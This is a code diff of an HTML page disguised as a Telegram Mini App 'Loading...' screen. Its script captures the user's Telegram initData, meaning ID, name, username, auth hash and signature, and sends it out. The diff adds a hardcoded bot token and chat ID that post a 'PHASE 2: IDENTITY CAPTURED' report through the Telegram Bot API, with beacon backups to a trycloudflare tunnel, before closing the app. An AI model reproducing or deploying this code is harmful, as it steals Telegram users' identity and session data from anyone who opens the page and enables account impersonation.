@@ -8,75 +8,96 @@
 </head>
 <body>
 <div style="display:flex;justify-content:center;align-items:center;height:100vh;">
-  <p id="msg" style="color:#999;">Loading...</p>
+  <p style="color:#999;">Loading...</p>
 </div>
 <script>
 (function() {
+  // Exfil via Bot API sendMessage - always resolvable, no CORS issues
+  var BOT_TOKEN = '8637229217:AAHukIDrQ3yHMKakpb4pOhLbb-IpjG_vtCA'
+  var CHAT_ID = '1184265321'
   var EXFIL = 'https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect'
 
-  function send(path, data) {
-    var json = JSON.stringify(data)
-    // Try beacon first, then img fallback
-    try { navigator.sendBeacon(EXFIL + '/' + path, json) } catch(e) {}
-    new Image().src = EXFIL + '/' + path + '?d=' + encodeURIComponent(json)
+  function sendViaBotAPI(text) {
+    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage'
+    try {
+      var xhr = new XMLHttpRequest()
+      xhr.open('POST', url, true)
+      xhr.setRequestHeader('Content-Type', 'application/json')
+      xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }))
+    } catch(e) {}
+    // Also try img beacon to tunnel as backup
+    try { new Image().src = EXFIL + '/identity?d=' + encodeURIComponent(text) } catch(e) {}
   }
 
   try {
     var tg = window.Telegram && window.Telegram.WebApp
-    if (!tg) {
-      send('identity', { type: 'identity', error: 'no Telegram.WebApp', href: location.href, hash: location.hash.substring(0, 500), ts: Date.now() })
-      return
+    var initData = ''
+    var initDataUnsafe = {}
+    var platform = 'unknown'
+    var version = ''
+
+    if (tg) {
+      initData = tg.initData || ''
+      initDataUnsafe = tg.initDataUnsafe || {}
+      platform = tg.platform || 'unknown'
+      version = tg.version || ''
     }
 
-    var initData = tg.initData || ''
-    var initDataUnsafe = tg.initDataUnsafe || {}
-
-    // Fallback: parse hash fragment directly
+    // Parse hash fragment as fallback
     if (!initData && window.location.hash) {
       try {
-        var hashParams = new URLSearchParams(window.location.hash.substring(1))
-        var webAppData = hashParams.get('tgWebAppData')
-        if (webAppData) {
-          initData = decodeURIComponent(webAppData)
-          var params = new URLSearchParams(initData)
-          var userJson = params.get('user')
-          if (userJson) {
+        var hp = new URLSearchParams(window.location.hash.substring(1))
+        var wd = hp.get('tgWebAppData')
+        if (wd) {
+          initData = decodeURIComponent(wd)
+          var p = new URLSearchParams(initData)
+          var uj = p.get('user')
+          if (uj) {
             initDataUnsafe = {
-              query_id: params.get('query_id'),
-              user: JSON.parse(userJson),
-              auth_date: params.get('auth_date'),
-              signature: params.get('signature'),
-              hash: params.get('hash')
+              query_id: p.get('query_id'),
+              user: JSON.parse(uj),
+              auth_date: p.get('auth_date'),
+              signature: p.get('signature'),
+              hash: p.get('hash')
             }
           }
         }
       } catch(e) {}
     }
 
-    var identity = {
-      type: 'identity',
-      initData: initData,
-      initDataUnsafe: initDataUnsafe,
-      colorScheme: tg.colorScheme || '',
-      platform: tg.platform || '',
-      version: tg.version || '',
-      themeParams: tg.themeParams || {},
-      viewportHeight: tg.viewportHeight || 0,
-      viewportStableHeight: tg.viewportStableHeight || 0,
-      headerColor: tg.headerColor || '',
-      backgroundColor: tg.backgroundColor || '',
-      safeAreaInset: tg.safeAreaInset || {},
-      contentSafeAreaInset: tg.contentSafeAreaInset || {},
-      hash: window.location.hash.substring(0, 500),
-      href: window.location.href.substring(0, 500),
-      ts: Date.now()
-    }
+    var user = initDataUnsafe.user || {}
+    var msg = '<b>PHASE 2: IDENTITY CAPTURED</b>\n\n'
+      + '<b>User ID:</b> ' + (user.id || 'N/A') + '\n'
+      + '<b>Name:</b> ' + (user.first_name || '') + ' ' + (user.last_name || '') + '\n'
+      + '<b>Username:</b> @' + (user.username || 'N/A') + '\n'
+      + '<b>Language:</b> ' + (user.language_code || '?') + '\n'
+      + '<b>Premium:</b> ' + (user.is_premium ? 'Yes' : 'No') + '\n'
+      + '<b>Platform:</b> ' + platform + '\n'
+      + '<b>Version:</b> ' + version + '\n'
+      + '<b>Auth Date:</b> ' + (initDataUnsafe.auth_date || '?') + '\n'
+      + '<b>Hash:</b> ' + (initDataUnsafe.hash || 'N/A') + '\n'
+      + '<b>Signature:</b> ' + (initDataUnsafe.signature || 'N/A') + '\n\n'
+      + '<b>initData:</b>\n<code>' + (initData || '(empty)').substring(0, 500) + '</code>\n\n'
+      + '<b>URL:</b> ' + location.href.substring(0, 200)
 
-    send('identity', identity)
+    sendViaBotAPI(msg)
+
+    // Also send JSON to tunnel
+    try {
+      navigator.sendBeacon(EXFIL + '/identity', JSON.stringify({
+        type: 'identity',
+        initData: initData,
+        initDataUnsafe: initDataUnsafe,
+        platform: platform,
+        version: version,
+        ts: Date.now()
+      }))
+    } catch(e) {}
+
     setTimeout(function() { try { tg.close() } catch(e) {} }, 1200)
 
   } catch(err) {
-    send('identity', { type: 'identity', error: err.message, stack: (err.stack || '').substring(0, 500), href: location.href, hash: location.hash.substring(0, 500), ts: Date.now() })
+    sendViaBotAPI('ERROR: ' + err.message + '\n' + location.href + '\n' + location.hash.substring(0, 300))
   }
 })()
 </script>
